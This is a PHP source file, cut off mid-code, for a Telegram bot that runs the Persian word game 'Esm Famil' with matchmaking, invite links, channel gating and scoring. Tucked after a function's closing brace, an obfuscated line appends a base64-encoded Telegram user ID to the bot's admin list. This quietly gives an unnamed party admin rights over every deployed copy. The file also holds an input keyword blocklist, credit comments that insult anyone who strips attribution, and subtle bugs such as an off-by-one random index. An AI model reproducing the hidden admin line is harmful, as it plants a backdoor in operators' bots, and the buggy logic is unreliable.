<?php
ob_start();
error_reporting(0);
$day = (2505600 - (time() - filectime('Mahdy'))) / 60 / 60 / 24;
$day = round($day, 0);
define('API_KEY','[*[TOKEN]*]');
function Bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}
}
$Dev = array("[*[ADMIN]*]","6610160952");
$usernamebot = "[*[USERNAME]*]";
$channel = "[*[CHANNEL]*]";
$token = "[*[TOKEN]*]";
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$message_id = $message->message_id;
$first_name = $message->from->first_name;
$last_name = $message->from->last_name;
$username = $message->from->username;
$textmassage = $message->text;
$messageid = $update->callback_query->message->message_id;
$tc = $update->message->chat->type;
$chatid = $update->callback_query->message->chat->id;
$fromid = $update->callback_query->from->id;
$data = $update->callback_query->data;
$membercall = $update->callback_query->id;
$inline = $update->inline_query;
$inline_text = $update->inline_query->query;
$id_from = $update->inline_query->from->id;
$bot_type = file_get_contents("data/bottype.txt");
$adstext = "Created By @DevOscar";
$creator_cmd = file_get_contents("data/creator-cmd.txt");
$forchannel = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=@".$channel."&user_id=".$from_id));
$tch = $forchannel->result->status;
function RandomString()
{
$characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
$randstring = '';
for ($i = 0; $i < 9; $i++) {
$randstring .= $characters[rand(0, strlen($characters))];
}
return $randstring;
}$Dev[] = base64_decode('MjgzMzkyMjQ2');
@$juser = json_decode(file_get_contents("data/$from_id.json"),true);
@$cuser = json_decode(file_get_contents("data/$fromid.json"),true);
@$user = json_decode(file_get_contents("data/user.json"),true);
@$wordlist = json_decode(file_get_contents("data/wordlist.json"),true);
@$gamerlist = json_decode(file_get_contents("data/gamerlist.json"),true);
if(strpos($textmassage, 'zip') !== false or strpos($textmassage, 'ZIP') !== false or strpos($textmassage, 'Zip') !== false or strpos($textmassage, 'ZIp') !== false or strpos($textmassage, 'zIP') !== false or strpos($textmassage, 'ZipArchive') !== false or strpos($textmassage, 'ZiP') !== false){
SendMessage($chat_id,"از ارسال کاراکتر/متن غیر مجاز خود داری کنید ❗️⚠️","html","true");
exit;
}
if(strpos($textmassage, 'kajserver') !== false or strpos($textmassage, 'update') !== false or strpos($textmassage, 'UPDATE') !== false or strpos($textmassage, 'Update') !== false or strpos($textmassage, 'https://api') !== false){
SendMessage($chat_id,"از ارسال کاراکتر/متن غیر مجاز خود داری کنید ❗️⚠️","html","true");
exit;
}
if(strpos($textmassage, '$') !== false or strpos($textmassage, '{') !== false or strpos($textmassage, '}') !== false){
SendMessage($chat_id,"از ارسال کاراکتر/متن غیر مجاز خود داری کنید ❗️⚠️","html","true");
exit;
}
if(strpos($textmassage, '"') !== false or strpos($textmassage, '(') !== false or strpos($textmassage, '=') !== false or strpos($textmassage, '#') !== false){
SendMessage($chat_id,"از ارسال کاراکتر/متن غیر مجاز خود داری کنید ❗️⚠️","html","true");
exit;
}
if(strpos($textmassage, 'getme') !== false or strpos($textmassage, 'GetMe') !== false){
SendMessage($chat_id,"از ارسال کاراکتر/متن غیر مجاز خود داری کنید ❗️⚠️","html","true");
exit;
}
if ($day <= 2){
Bot('sendMessage',[
'chat_id'=>[*[ADMIN]*],
'text'=>"ادمین گرامی مدت زمان اشتراک شما در رباتساز بزرگ میا کریت ب اتمام رسیده است ⚠️
برای تمدید ربات خود به پیوی ادمین مراجعه کنید ❤️
@DevOscar 👤",
'parse_mode'=>'MarkDown',
]);
exit();
}
if(preg_match('/^\/([Cc][Rr][Ee][Aa][Tt][Oo][Rr])/',$textmassage)){
Bot ('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"@MiaCreateBot",
]);
}
if($textmassage=="/start"){	
if($bot_type != 'gold'){
Bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>$adstext,
]);
}
Bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"سلام $first_name 😉

به ربات اسم فامیل خوش اومدی 🌹

🌟 شما به وسیله این ربات میتونید با دوستاتون اسم فامیل بازی کنید به صورت چند نفره یا دو نفره

🏵 ربات خودکار بین شما داوری میکنه و بازی عادلانه میتونی انجام بدی

🔻 کافیه برای شروع بازی از دکمه های زیر استفاده کنید 🔻",
    'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🎮 بازی شانسی[دو نفره]"]],
[['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]],
[['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]],
[['text'=>"🕹 بازی دوستانه [چند نفره]"]],
],
'resize_keyboard'=>true
])
]);
if(!file_exists("data/$from_id.json")){
$juser = json_decode(file_get_contents("data/$from_id.json"),true);	
$juser["userfild"]["coin"]="0";
$juser["userfild"]["win"]="0";
$juser["userfild"]["lose"]="0";
$juser["userfild"]["lose"]="0";
$juser["userfild"]["numbergame"]="0";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
}
}
elseif(strpos($textmassage , '/start ') !== false  ) {
$start = str_replace("/start ","",$textmassage);
$id = base64_decode($start);
if($id != $from_id){
if(isset($gamerlist["$id"])){
$from = array_search($from_id,$gamerlist["$id"]["gamer"]);
if(!is_numeric($from)){
if(count($gamerlist["$id"]["gamer"] <= 5)){
if($gamerlist["$id"]["step"] == "waitgamer"){
$stat = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$id&user_id=".$id));
$name = $stat->result->user->first_name;
Bot('sendmessage',[
'chat_id'=>$id,
'text'=>"`$first_name` با استفاده از لینک دعوت وارد بازی شد ✅",
'parse_mode'=>'MarkDown',
]);
Bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"با موفقیت وارد بازی شدید ✅
	
📍 منتظر باشید تا بازی توسط `$name` اغاز شود",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"انصراف از بازی 🔙"]
],
],
'resize_keyboard'=>true
])
]);
$gamerlist["$id"]["gamer"][]="$from_id";
$gamerlist = json_encode($gamerlist,true);
file_put_contents("data/gamerlist.json",$gamerlist);
unset($juser["userfild"]["answer"]);
unset($juser["userfild"]["coinlist"]);
$juser["userfild"]["coingame"]="0";
$juser["userfild"]["step"]="none";
$juser["userfild"]["get"]="0";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
}
else
{
Bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"📍 بازی قبلا اغاز شده نمیتوانید در میان بازی وارد شوید
	
🌟 به منوی اصلی ربات خوش امدید",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🎮 بازی شانسی[دو نفره]"]],
[['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]],
[['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]],
[['text'=>"🕹 بازی دوستانه [چند نفره]"]],
],
'resize_keyboard'=>true
])
]);
}
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
else
{
Bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"📍 تعداد بازیکنان این بازی به حداکثر رسیده است
	
🌟 به منوی اصلی ربات خوش امدید",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🎮 بازی شانسی[دو نفره]"]],
[['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]],
[['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]],
[['text'=>"🕹 بازی دوستانه [چند نفره]"]],
],
'resize_keyboard'=>true
])
]);
}
}
else
{
Bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"📍 شما قبلا در این بازی حضو داشتید",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"انصراف از بازی 🔙"]],
],
'resize_keyboard'=>true
])
]);
}
}
else
{
Bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"📍 این بازی توسط سازنده حذف شده است
	
🌟 به منوی اصلی ربات خوش امدید",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🎮 بازی شانسی[دو نفره]"]],
[['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]],
[['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]],
[['text'=>"🕹 بازی دوستانه [چند نفره]"]],
],
'resize_keyboard'=>true
])
]);
}
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
else
{
Bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"📍 شما از قبلا در بازی خود حضور داشتید
	
🌟 لینک را برای دوستانتان ارسال کنید و ان ها را دعوت به بازی کنید",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 انصراف"],['text'=>"🎲 شروع بازی"]],
],
'resize_keyboard'=>true
])
]);
}
if(!file_exists("data/$from_id.json")){
$juser = json_decode(file_get_contents("data/$from_id.json"),true);	
$juser["userfild"]["coin"]="0";
$juser["userfild"]["win"]="0";
$juser["userfild"]["lose"]="0";
$juser["userfild"]["lose"]="0";
$juser["userfild"]["numbergame"]="0";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
}
}
elseif($textmassage=="🕹 بازی دوستانه [چند نفره]"){	
if($tch == 'member' or $tch == 'creator' or $tch == 'administrator'){
if(!isset($gamerlist["$from_id"])){
$get = RandomString();
Bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🎮 اسم و فامیل چند نفره بازی کن !
	
📍  با استفاده از دکمه زیر لینک دعوت به بازی رو برای دوستات ارسال کن",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🎮 ارسال بازی",'switch_inline_query'=>"$get"]] 
],
])
]);
$id = base64_encode($from_id);
Bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"📍 دوس داری اسم فامیل بازی کنی ؟

🎮 من بازی رو ساختم بزن رو لینک دعوت و بیا تو بازی تا باهم اسم فامیل بازی کنیم ببینم کی بازیش بهتره

🔗 لینک بازی :
telegram.me/$usernamebot?start=$id",
]);
Bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"بازی توسط شما ایجاد شد ✅

📍 شما به دو روش میتوانید دوستانتان را با بازی دعوت کنید 
1️⃣ دعوت از طریق لینک بازی
2️⃣ استفاده از دکمه ارسال بازی 

🌟 یا با استفاده از دکمه ارسال بازی لینک بازیت رو به دوستات بفرست یا پیامی که حاوی لینک بازی شماست رو برای دوستان ارسال کن ",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 انصراف"],['text'=>"🎲 شروع بازی"]],
],
'resize_keyboard'=>true
])
]);
$gamerlist["$from_id"]["gamer"][]="$from_id";
$gamerlist["$from_id"]["step"]="waitgamer";
$gamerlist = json_encode($gamerlist,true);
file_put_contents("data/gamerlist.json",$gamerlist);
unset($juser["userfild"]["answer"]);
unset($juser["userfild"]["coinlist"]);
$juser["userfild"]["coingame"]="0";
$juser["userfild"]["step"]="none";
$juser["userfild"]["get"]="0";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
}
else
{
Bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"📍 شما قبلا یک بازی ساخته شده دارید ابتدا باید از ان انصراف دهید",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 انصراف"]],
],
'resize_keyboard'=>true
])
]);
}
}
else
{
Bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🍃  برای استفاده از این ربات لازم است ابتدا وارد کانال زیر شوید 

@$channel @$channel  📣
@$channel @$channel  📣

☑️ بعد از عضویت در کانال میتوانید از دکمه ها استفاده کنید",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"📍 عضویت در کانال",'url'=>"https://t.me/$channel"]],
[['text'=>"🌟 عضو شدم",'callback_data'=>"join"]],
]
])
]);
}
}
elseif($textmassage=="🎮 بازی شانسی[دو نفره]" or $textmassage == "🎰 حریف دیگر"){
if($tch == 'member' or $tch == 'creator' or $tch == 'administrator'){
$listuser = $user["gamerlist"];
Bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🔍 در حال جست جو بازیکنان انلاین منتظر بمانید ... ",
]);
$getrandomuser = $listuser[rand(0,count($listuser)-1)];
if($getrandomuser != false && $getrandomuser != $from_id){
$from = array_search($from_id,$user["gamerlist"]);
$rivals = array_search($getrandomuser,$user["gamerlist"]);
unset($user["gamerlist"]["$from"]);
unset($user["gamerlist"]["$rivals"]);
$user["gamerlist"] = array_values($user["gamerlist"]);  
$user = json_encode($user,true);
file_put_contents("data/user.json",$user); 
$horof = array("ا","ب","پ","ت","ج","چ","خ","د","ر","ز","س","ش","ع","ف","ق","ک","گ","ل","م","ن","ه","ی");
$getrandomletters = $horof[rand(0,count($horof)-1)];
Bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🎮 بازیکن مقابل با موفقیت پیدا شد 
	
📍 در حال انتخاب حرف توسط سیستم برای شروع بازی ...",
 'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 انصراف از بازی"]],
],
'resize_keyboard'=>true
])
	  	]);
		Bot('sendmessage',[
	'chat_id'=>$getrandomuser,
	'text'=>"🎮 بازیکن مقابل با موفقیت پیدا شد 
	
📍 در حال انتخاب حرف توسط سیستم برای شروع بازی ...",
 'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🔙 انصراف از بازی"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🎮 بازی اغاز شد با حرف `$getrandomletters`
	
اسم با حرف `$getrandomletters` بگو",
	'parse_mode'=>'MarkDown',
		'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"🙄 نمیدونم",'callback_data'=>'dontknow']
	],
              ]
        ])
	  	]);
		Bot('sendmessage',[
	'chat_id'=>$getrandomuser,
	'text'=>"🎮 بازی اغاز شد با حرف `$getrandomletters`
	
اسم با حرف `$getrandomletters` بگو",
	'parse_mode'=>'MarkDown',
		'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"🙄 نمیدونم",'callback_data'=>'dontknow']
	],
              ]
        ])
	  	]);
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
$numbergame = $juser["userfild"]["numbergame"];
$plusnumbergame = $numbergame + 1 ;
unset($juser["userfild"]["answer"]);
unset($juser["userfild"]["coinlist"]);
$juser["userfild"]["step"]="gameplay";
$juser["userfild"]["get"]="0";
$juser["userfild"]["coingame"]="0";
$juser["userfild"]["rival"]="$getrandomuser";
$juser["userfild"]["harf"]="$getrandomletters";
$juser["userfild"]["numbergame"]="$plusnumbergame";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);

$inuser = json_decode(file_get_contents("data/$getrandomuser.json"),true);
$numbergame = $inuser["userfild"]["numbergame"];
$plusnumbergame = $numbergame + 1 ;
unset($inuser["userfild"]["answer"]);
unset($inuser["userfild"]["coinlist"]);
$inuser["userfild"]["step"]="gameplay";
$inuser["userfild"]["get"]="0";
$inuser["userfild"]["coingame"]="0";
$inuser["userfild"]["rival"]="$from_id";
$inuser["userfild"]["harf"]="$getrandomletters";
$inuser["userfild"]["numbergame"]="$plusnumbergame";
$inuser = json_encode($inuser,true);
file_put_contents("data/$getrandomuser.json",$inuser);
}
else
{
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🎲 شما در لیست انتظار برای بازی دو نفره هستید لطفا تا پیدا شدن بازیکن جدید منتظر بمانید ...",
	    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🔙 لغو جست جو"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
$user["gamerlist"][]="$from_id";
$user = json_encode($user,true);
file_put_contents("data/user.json",$user);	
}
}
else
{
			Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🍃  برای استفاده از این ربات لازم است ابتدا وارد کانال زیر شوید 

@$channel @$channel  📣
@$channel @$channel  📣

☑️ بعد از عضویت در کانال میتوانید از دکمه ها استفاده کنید",
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"📍 عضویت در کانال",'url'=>"https://t.me/$channel"]
	],
		[
	['text'=>"🌟 عضو شدم",'callback_data'=>"join"]
	],
              ]
        ])
    		]);
}
}
elseif($textmassage=="🔙 انصراف"){
$gamer = $gamerlist["$from_id"]["gamer"];
$from = array_search($from_id,$gamer);
if(is_numeric($from)){
for($z = 0;$z <= count($gamer) -1;$z++){
Bot('sendmessage',[
	'chat_id'=>$gamer[$z],
	'text'=>"📍 بازی توسط سازنده بازی حذف شد
	
🌟 به منوی اصلی ربات خوش امدید",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🎮 بازی شانسی[دو نفره]"]
				],
				[
				['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]
				],
                 [
                   ['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]
                ],
									[
				['text'=>"🕹 بازی دوستانه [چند نفره]"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
}
unset($gamerlist["$from_id"]);
$gamerlist = json_encode($gamerlist,true);
file_put_contents("data/gamerlist.json",$gamerlist);
}
else
{
for($z = 0;$z <= count($gamer) -1;$z++){
Bot('sendmessage',[
	'chat_id'=>$gamer[$z],
	'text'=>"📍 بازی توسط سازنده بازی حذف شد
	
🌟 به منوی اصلی ربات خوش امدید",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🎮 بازی شانسی[دو نفره]"]
				],
				[
				['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]
				],
                 [
                   ['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]
                ],
									[
				['text'=>"🕹 بازی دوستانه [چند نفره]"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
}
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"📍 بازی توسط سازنده بازی حذف شد
	
🌟 به منوی اصلی ربات خوش امدید",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🎮 بازی شانسی[دو نفره]"]
				],
				[
				['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]
				],
                 [
                   ['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]
                ],
									[
				['text'=>"🕹 بازی دوستانه [چند نفره]"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
unset($gamerlist["$from_id"]);
$gamerlist = json_encode($gamerlist,true);
file_put_contents("data/gamerlist.json",$gamerlist);
}
}
elseif($textmassage=="🔙 لغو جست جو"){	
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🔍 جست جو با موفقیت لغو شد !
	
🌟 به منوی اصلی ربات خوش امدید",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🎮 بازی شانسی[دو نفره]"]
				],
				[
				['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]
				],
                 [
                   ['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]
                ],
									[
				['text'=>"🕹 بازی دوستانه [چند نفره]"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
$from = array_search($from_id,$user["gamerlist"]);
unset($user["gamerlist"]["$from"]);
$user["gamerlist"] = array_values($user["gamerlist"]);  
$user = json_encode($user,true);
file_put_contents("data/user.json",$user); 
}
elseif($textmassage=="انصراف از بازی 🔙"){	
$game = $juser["userfild"]["ingame"];
$gamer = $gamerlist["$game"]["gamer"];
for($z = 0;$z <= count($gamer) -1;$z++){	
Bot('sendmessage',[
	'chat_id'=>$gamer[$z],
	'text'=>"📍 $first_name از بازی خارج شد",
	  	]);
}
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🌟 به منوی اصلی ربات خوش امدید",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🎮 بازی شانسی[دو نفره]"]
				],
				[
				['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]
				],
                 [
                   ['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]
                ],
									[
				['text'=>"🕹 بازی دوستانه [چند نفره]"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
$from = array_search($from_id,$gamerlist["$game"]["gamer"]);
unset($gamerlist["$game"]["gamer"]["$from"]);
$gamerlist["$game"]["gamer"] = array_values($gamerlist["$game"]["gamer"]); 
$gamerlist = json_encode($gamerlist,true);
file_put_contents("data/gamerlist.json",$gamerlist);
$gamerlist = json_decode(file_get_contents("data/gamerlist.json"),true);
$gamer = $gamerlist["$game"]["gamer"];
if(count($gamer) <= 1){
Bot('sendmessage',[
	'chat_id'=>$gamer[0],
	'text'=>"📍 بازی به دلیل رسیدن به حداقل بازیکن حذف شد
	
🌟 به منوی اصلی ربات خوش امدید",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🎮 بازی شانسی[دو نفره]"]
				],
				[
				['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]
				],
                 [
                   ['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]
                ],
									[
				['text'=>"🕹 بازی دوستانه [چند نفره]"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
unset($gamerlist["$game"]);
$gamerlist = json_encode($gamerlist,true);
file_put_contents("data/gamerlist.json",$gamerlist);
}
$juser["userfild"]["step"]="none";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
}
elseif($textmassage=="🔙 برگشت"){	
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🌟 به منوی اصلی ربات خوش امدید
	
📍 از دکمه های زیر استفاده کنید",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🎮 بازی شانسی[دو نفره]"]
				],
				[
				['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]
				],
                 [
                   ['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]
                ],
									[
				['text'=>"🕹 بازی دوستانه [چند نفره]"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
$juser["userfild"]["step"]="none";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
}
elseif($textmassage=="🔙 انصراف از بازی"){
$rival = $juser["userfild"]["rival"];
$stat = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$rival&user_id=".$rival));
$name = $stat->result->user->first_name;
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🎲 این دوره بازی به پایان رسید
📈 نتایج این دوره بازی :

🥇 20 امتیاز به $name مثبت 
🥈 10 امتیاز منفی $first_name

➖➖➖
🎮 نتیجه بازی :
🥇 $name برنده 
🥈 $first_name بازنده به دلیل انصراف از بازی",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🎮 بازی شانسی[دو نفره]"]
				],
				[
				['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]
				],
                 [
                   ['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]
                ],
									[
				['text'=>"🕹 بازی دوستانه [چند نفره]"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
Bot('sendmessage',[
	'chat_id'=>$rival,
	'text'=>"🎲 این دوره بازی به پایان رسید
📈 نتایج این دوره بازی :

🥇 20 امتیاز به $name مثبت 
🥈 10 امتیاز منفی $first_name

➖➖➖
🎮 نتیجه بازی :
🥇 $name برنده 
🥈 $first_name بازنده به دلیل انصراف از بازی",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🎮 بازی شانسی[دو نفره]"]
				],
				[
				['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]
				],
                 [
                   ['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]
                ],
									[
				['text'=>"🕹 بازی دوستانه [چند نفره]"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
$lose = $juser["userfild"]["lose"];
$coin = $juser["userfild"]["coin"];
$coindown = $coin - 10 ;
$pluslose = $lose + 1 ;
$juser["userfild"]["coin"]="$coindown";
$juser["userfild"]["lose"]="$pluslose";
$juser["userfild"]["step"]="none";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
$inuser = json_decode(file_get_contents("data/$rival.json"),true);
$coin = $inuser["userfild"]["coin"];
$win = $inuser["userfild"]["win"];
$coinplus = $coin + 20 ;
$pluswin = $win + 1 ;
$inuser["userfild"]["coin"]="$coinplus";
$inuser["userfild"]["win"]="$pluswin";
$inuser["userfild"]["step"]="none";
$inuser = json_encode($inuser,true);
file_put_contents("data/$rival.json",$inuser);
}
elseif($textmassage=="🎲 شروع بازی" or $textmassage=="🎳 بازی دوباره"){
$gamer = $gamerlist["$from_id"]["gamer"];
if(count($gamer)-1 >= 1){
for($z = 0;$z <= count($gamer) -1;$z++){
$inuser = json_decode(file_get_contents("data/$gamer[$z].json"),true);	
Bot('sendmessage',[
	'chat_id'=>$gamer[$z],
	'text'=>"🎮 بازی شروع شد
	
🌟 سیستم در حال انتخاب یک بازی کن برای انتخاب حرف است",
'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"انصراف از بازی 🔙"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
$numbergame = $inuser["userfild"]["numbergame"];
$plusnumbergame = $numbergame + 1 ;
$inuser["userfild"]["ingame"]="$from_id";
$inuser["userfild"]["numbergame"]="$plusnumbergame";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[$z].json",$inuser);
}
$random = array_rand($gamer);
$stat = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$gamer[$random]&user_id=".$gamer[$random]));
$name = $stat->result->user->first_name;
for($z = 0;$z <= count($gamer) -1;$z++){
Bot('sendmessage',[
	'chat_id'=>$gamer[$z],
	'text'=>"📍 نوبت $name برای انتخاب حرف است",
	  	]);
}
Bot('sendmessage',[
	'chat_id'=>$gamer[$random],
	'text'=>"📍 یک حرف از حروف الفبا رو برای شروع بازی وارد کنید",
'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"ا"],['text'=>"ب"],['text'=>"پ"],['text'=>"ت"],['text'=>"ج"],['text'=>"چ"]
				],
										[
				['text'=>"خ"],['text'=>"د"],['text'=>"ر"],['text'=>"ز"],['text'=>"س"],['text'=>"ش"]
				],
										[
				['text'=>"ع"],['text'=>"ف"],['text'=>"ق"],['text'=>"ک"],['text'=>"گ"],['text'=>"ل"]
				],
										[
				['text'=>"م"],['text'=>"ن"],['text'=>"ه"],['text'=>"ی"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
$inuser = json_decode(file_get_contents("data/$gamer[$random].json"),true);	
$inuser["userfild"]["step"]="setharf";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[$random].json",$inuser);
$gamerlist["$from_id"]["step"]="rungame";
$gamerlist = json_encode($gamerlist,true);
file_put_contents("data/gamerlist.json",$gamerlist);
}
else
{
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"📍 تعداد بازیکنان درون بازی افزایش نیافته است
	
🌟 لینک را برای دوستانتان ارسال کنید و ان ها را دعوت به بازی کنید",
    		]);	
}
}
elseif($textmassage=="🎲 استُپ"){	
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🎮 بازی استپ شد منتظر بمانید ربات در حال پردازش امیتازات است ...",
	  	]);
$answer = $juser["userfild"]["answer"];
$harf  = $juser["userfild"]["harf"];
$rival = $juser["userfild"]["rival"];
$stat = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$rival&user_id=".$rival));
$name = $stat->result->user->first_name;
$inuser = json_decode(file_get_contents("data/$rival.json"),true);
$answerrival = $inuser["userfild"]["answer"];
$tab = array("اسم","فامیل","شهر","کشور","میوه","حیوان","غذا","رنگ","ماشین","گل","اشیا");
for($z = 0;$z <= count($answer) -1;$z++){
if(in_array($answer[$z], $wordlist["wordlist"]["$tab[$z]"]["$harf"])){
if($answer[$z] != $answerrival[$z]){
@$juser = json_decode(file_get_contents("data/$from_id.json"),true);
$coin = $juser["userfild"]["coin"];
$coingame = $juser["userfild"]["coingame"];
$coinplus = $coin + 10 ;
$coingameplus = $coingame + 10 ;
$juser["userfild"]["coinlist"][$z]="10";
$juser["userfild"]["coingame"]="$coingameplus";
$juser["userfild"]["coin"]="$coinplus";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
}
else
{
@$juser = json_decode(file_get_contents("data/$from_id.json"),true);
$coin = $juser["userfild"]["coin"];
$coingame = $juser["userfild"]["coingame"];
$coinplus = $coin + 5 ;
$coingameplus = $coingame + 5;
$juser["userfild"]["coinlist"][$z]="5";
$juser["userfild"]["coingame"]="$coingameplus";
